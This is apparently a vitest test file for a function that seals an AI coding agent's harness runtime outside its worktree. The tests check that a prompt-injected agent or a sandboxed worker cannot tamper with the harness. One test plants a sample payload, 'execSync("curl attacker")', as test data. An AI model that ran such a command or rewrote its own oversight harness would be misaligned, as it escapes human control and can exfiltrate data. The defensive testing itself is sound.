import { mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, relative, isAbsolute } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import { harnessScriptDigest, resolveHarnessScript, sealHarnessRuntime } from './runtime.js';

/**
 * Review finding (2026-07-27), sandbox escape.
 *
 * The runtime resolves its schemas relative to its own location
 * (`../references/*.schema.json` and `../../cez-code-review/references/*.md`),
 * so sealing only `harness.mjs` would move it somewhere it cannot run. The whole
 * skill tree comes along and the relative layout is preserved.
 */
describe('sealHarnessRuntime', () => {
  let worktree: string;
  let dest: string;

  const skillFile = (...parts: string[]) =>
    join(worktree, '.claude', 'skills', ...parts);

  beforeEach(() => {
    worktree = mkdtempSync(join(tmpdir(), 'cez-seal-wt-'));
    dest = mkdtempSync(join(tmpdir(), 'cez-seal-dest-'));
    mkdirSync(skillFile('cez-harness', 'scripts'), { recursive: true });
    mkdirSync(skillFile('cez-harness', 'references'), { recursive: true });
    mkdirSync(skillFile('cez-code-review', 'references'), { recursive: true });
    writeFileSync(skillFile('cez-harness', 'scripts', 'harness.mjs'), 'export const real = 1\n');
    writeFileSync(skillFile('cez-harness', 'references', 'review-result.schema.json'), '{}');
    writeFileSync(skillFile('cez-code-review', 'references', 'review-checklist.md'), '# checklist');
  });

  afterEach(() => {
    rmSync(worktree, { recursive: true, force: true });
    rmSync(dest, { recursive: true, force: true });
  });

  it('seals the runtime outside the worktree', () => {
    const sealed = sealHarnessRuntime(worktree, dest)!;

    expect(sealed).not.toBeNull();
    const escaped = relative(worktree, sealed.script);
    expect(escaped.startsWith('..') || isAbsolute(escaped)).toBe(true);
    expect(readFileSync(sealed.script, 'utf8')).toBe('export const real = 1\n');
  });

  it('carries the sibling files the runtime resolves relatively', () => {
    const sealed = sealHarnessRuntime(worktree, dest)!;
    const runtimeDir = join(sealed.script, '..');

    // `../references/…` and `../../cez-code-review/references/…`
    expect(readFileSync(join(runtimeDir, '..', 'references', 'review-result.schema.json'), 'utf8')).toBe('{}');
    expect(
      readFileSync(
        join(runtimeDir, '..', '..', 'cez-code-review', 'references', 'review-checklist.md'),
        'utf8',
      ),
    ).toBe('# checklist');
  });

  it('is immune to a later rewrite of the worktree copy', () => {
    const sealed = sealHarnessRuntime(worktree, dest)!;

    // Exactly what a prompt-injected implement phase or the sandboxed worker
    // could do: `.claude/skills/` is inside the worktree.
    writeFileSync(
      resolveHarnessScript(worktree)!,
      'import{execSync}from"node:child_process";execSync("curl attacker")\n',
    );

    expect(readFileSync(sealed.script, 'utf8')).toBe('export const real = 1\n');
    expect(harnessScriptDigest(sealed.script)).toBe(sealed.sha256);
  });

  it('detects tampering with the sealed copy itself', () => {
    const sealed = sealHarnessRuntime(worktree, dest)!;

    writeFileSync(sealed.script, 'export const real = 2\n');

    expect(harnessScriptDigest(sealed.script)).not.toBe(sealed.sha256);
  });

  it('seals a symlinked skill by value, not by reference', () => {
    // A team skill materializes as a symlink; sealing the LINK would point
    // straight back at the mutable tree and defeat the whole exercise.
    const linkTarget = mkdtempSync(join(tmpdir(), 'cez-seal-team-'));
    mkdirSync(join(linkTarget, 'scripts'), { recursive: true });
    writeFileSync(join(linkTarget, 'scripts', 'harness.mjs'), 'export const team = 1\n');
    rmSync(skillFile('cez-harness'), { recursive: true, force: true });
    symlinkSync(linkTarget, skillFile('cez-harness'), 'dir');

    const sealed = sealHarnessRuntime(worktree, dest)!;
    writeFileSync(join(linkTarget, 'scripts', 'harness.mjs'), 'export const tampered = 1\n');

    expect(readFileSync(sealed.script, 'utf8')).toBe('export const team = 1\n');
    rmSync(linkTarget, { recursive: true, force: true });
  });

  it('returns null when there is no runtime to seal', () => {
    rmSync(skillFile('cez-harness'), { recursive: true, force: true });

    expect(sealHarnessRuntime(worktree, dest)).toBeNull();
  });

  it('reseals cleanly over a previous run', () => {
    const first = sealHarnessRuntime(worktree, dest)!;
    writeFileSync(skillFile('cez-harness', 'scripts', 'harness.mjs'), 'export const real = 3\n');

    const second = sealHarnessRuntime(worktree, dest)!;

    expect(second.sha256).not.toBe(first.sha256);
    expect(readFileSync(second.script, 'utf8')).toBe('export const real = 3\n');
  });
});
